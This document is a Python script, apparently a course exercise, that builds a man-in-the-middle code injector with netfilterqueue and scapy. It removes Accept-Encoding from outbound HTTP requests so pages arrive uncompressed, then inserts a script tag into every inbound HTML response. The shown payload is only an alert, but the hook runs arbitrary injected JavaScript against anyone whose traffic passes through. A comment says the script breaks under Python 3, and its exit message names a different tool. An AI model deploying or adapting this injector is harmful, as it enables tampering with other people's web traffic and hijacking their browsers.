#!/usr/bin/env python

#doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object

import netfilterqueue
import re
import scapy.all as scapy
import subprocess

def set_iptables(): #automate setting IPtables for testing on localhost
    print("\n[+] Setting up IPTables\n")
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.call(["iptables", "--flush"])
    
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("===================================")
            print("[+] HTTP Request outbound found")
            print("===================================")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            #this will match the entire string Accept-Encoding that appears in the Raw layer
            #and replace it with an empty string; this causes the browser to tell the server
            #it doesn't take any form of encoding, and the server will deliver the plaintext
            #web code
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
            #regex to find and replace field that specifies encoding types accepted
            #replace with "" - empty string
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
            print("===================================")
            print("[+] HTTP Response Inbound found:")
            print("===================================")
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('JS injection');</script></body>")
            #replace is a Python method to replace
            #a string with something else
            #print(scapy_packet.show())
            
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
            
            #want to first show the packet contents to see what fields to modify
            #using this you see that the Raw layer contains following:
            #Accept-Encoding: gzip, deflate
            #HTML is compressed with gzip then sent to client from server

    packet.accept() #forward packets to target, connectivity seems normal
    
set_iptables()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopping file download interceptor")
    restore_iptables()
